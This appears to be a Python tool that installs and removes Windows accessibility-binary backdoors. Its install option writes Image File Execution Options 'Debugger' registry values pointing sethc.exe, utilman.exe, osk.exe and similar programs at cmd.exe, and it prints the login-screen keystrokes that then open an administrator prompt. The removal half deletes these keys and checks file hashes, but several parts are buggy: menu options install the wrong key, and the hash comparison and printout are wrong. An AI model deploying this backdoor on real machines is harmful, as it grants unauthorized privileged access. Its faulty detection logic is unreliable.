import os
import subprocess
import winreg
from hash import calculate_sha256, calculate_md5
from config import header, bar

# TODO: use takeown.exe and icacls.exe to take ownership/perms away from TrustedInstaller
def install_backdoor(path):
    fileName = os.path.basename(path).strip(' ')

    print("Adding " + fileName + " backdoor to registry.")
    try:
        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, path)
        try:
            winreg.SetValueEx(key, 'Debugger', 0, winreg.REG_SZ, cmdPath)
        except Exception as e:
            print(e)
            print("Error: Could not create sub-key. Please run with Administrator privileges.")
    except Exception as e:
        print(e)
        print("Error: Could not create key. Please run with Administrator privileges.")


def remove_backdoor(path):
    print(bar)
    fileName = os.path.basename(path).strip(' ')
    print("Validating " + fileName + " hash against cmd.exe, explorer.exe, and powershell.exe hashes")
    # calculate hashes
    sha256 = calculate_sha256(path)

    if sha256 == (cmdSha or explorerSha or powershellSha):
        print(fileName + " file has been replaced.")
        print(fileName + " Sha256:\n" + sha256)
        print("cmd.exe Sha256:\n" + cmdSha)
        print("explorer.exe Sha256:\n" + explorerSha)
        print("powershell.exe Sha256:\n" + explorerSha)
        # TODO: provide download link
        print("Please download a legitimate version from Microsoft.")
    else:
        print(fileName + " hashes do not match cmd.exe, explorer.exe, or powershell.exe")

    print("Performing " + fileName + " registry analysis.")

    registryPath = "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\\" + fileName

    # test if key exists
    try:
        print("Attempting to open " + fileName + " key.")
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, registryPath, 0, winreg.KEY_ALL_ACCESS)
    except Exception as e:
        print(e)
        return

    # key was found
    print(fileName + " backdoor debugger registry entry found, attempting to remove.")
    cmd = ('REG DELETE "HKLM\\' + registryPath + '" /f')
    try:
        os.system(cmd)
    except Exception as e:
        print(e)
        return
    print("The " + fileName + " backdoor registry key has been removed.")


if __name__ == "__main__":
    print(header)
    # TODO: add narrator.exe, osk.exe, magnify.exe, displayswitch.exe,
    # get the current drive name
    drive = os.getenv('SystemDrive')
    sethcPath = (drive + '\windows\system32\sethc.exe ')
    sethcRegistryPath = ('SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe')
    utilmanPath = (drive + '\windows\system32\\utilman.exe ')
    utilmanRegistryPath = ('SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\\utilman.exe')
    narratorPath = (drive + '\windows\system32\\narrator.exe ')
    narratorRegistryPath = ('SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\\narrator.exe')
    oskPath = (drive + '\windows\system32\osk.exe ')
    oskRegistryPath = ('SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe')
    magnifyPath = (drive + '\windows\system32\magnify.exe ')
    magnifiyRegistryPath = ('SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe')
    displayswitchPath = (drive + '\windows\system32\displayswitch.exe ')
    displayswitchRegistryPath = ('SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\displayswitch.exe')

    cmdPath = (drive + '\windows\system32\cmd.exe ')
    explorerPath = (drive + '\windows\explorer.exe ')
    powershellPath = (drive + '\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\powershell.exe')
    cmdSha = calculate_sha256(cmdPath)
    explorerSha = calculate_sha256(explorerPath)
    powershellSha = calculate_sha256(powershellPath)

    while True:
        print(bar)
        print("[I]nstall Backdoor.\n[R]emove Backdoor.\n[C]onfigure Settings.\n[E]xit the Program.")
        choice = input("[>]").lower()
        # install backdoor
        if choice == 'i':
            print(bar)
            print("*WARNING: THIS WILL ALLOW UNAUTHORIZED ACCESS*")
            print("Which backdoor would you like to install?")
            print("[S]ticky Keys (sethc.exe).")
            print("[U]tility Manager (utilman.exe).")
            print("[D]isplay Switch (dispalyswitch.exe).")
            print("[M]agnify (magnify.exe).")
            print("[N]arrator (narrator.exe).")
            print("[O]n Screen Keyboard (osk.exe).")
            print("[A]ll.")
            print("[R]eturn to the Main Menu.")
            choice = input("[>]").lower()
            if choice == 's':
                print("At the login screen, press [Shift 5 times] to open command prompt with Administrator Privileges.")
                install_backdoor(sethcRegistryPath)
            elif choice == 'u':
                print("At the login screen, press [Windows Key + U] to open command prompt with Administrator Privileges.")
                install_backdoor(utilmanRegistryPath)
            elif choice == 'd':
                print("At the login screen, press [Windows Key + P] to open command prompt with Administrator Privileges.")
                install_backdoor(displayswitchRegistryPath)
            elif choice == 'm':
                print("At the login screen, press [Windows Key + U] and select Magnify to open command prompt with Administrator Privileges.")
                install_backdoor(magnifiyRegistryPath)
            elif choice == 'n':
                print("At the login screen, press [Windows Key + U] and select Narrator to open command prompt with Administrator Privileges.")
                install_backdoor(displayswitchRegistryPath)
            elif choice == 'o':
                print("At the login screen, press [Windows Key + U] and select On-Screen Keyboard to open command prompt with Administrator Privileges.")
                install_backdoor(displayswitchRegistryPath)
            # NOTE: Does not install
            elif choice == 'a':
                print("""At the login screen, to open the command prompt with Administrator Privileges:
                        ○ [Shift 5 times]
                        ○ [Windows Key + U] and select Narrator
                        ○ [Windows Key + U] and select On-Screen Keyboard
                        ○ [Windows Key + U] and select Magnify
                        ○ [Windows Key + P]""")
                install_backdoor(sethcRegistryPath)
                install_backdoor(narratorRegistryPath)
                install_backdoor(oskRegistryPath)
                install_backdoor(magnifiyRegistryPath)
                install_backdoor(displayswitchRegistryPath)
            elif choice == 'r':
                continue
            else:
                print("Incorrect input.")
                continue
        # remove backdoor
        elif choice == 'r':
            remove_backdoor(sethcPath)
            remove_backdoor(utilmanPath)
            remove_backdoor(narratorPath)
            remove_backdoor(oskPath)
            remove_backdoor(magnifyPath)
            remove_backdoor(displayswitchPath)
        elif choice == 'c':

            print("***Under Construction***\nPlease post any suggestions for configuration to www.github.com/gitgiant")
            print("[D]isable Windows accessibility options in registry. (doesnt work)")
            print("[E]nable Windows accessibility options in registry. (doesnt work)")
            print("[R]eturn to the Main Menu.")
            choice = input("[>]").lower()
            # TODO: Registry files do not work
            if choice == 'd':
                os.system("AccessibilityOFF.reg")
            elif choice == 'e':
                os.system("AccessibilityON.reg")
            elif choice == 'r':
                continue
            else:
                print("Incorrect input.")
                continue
        elif choice == 'e':
            print("Exiting...")
            exit(0)
        else:
            print("Incorrect input.")
            continue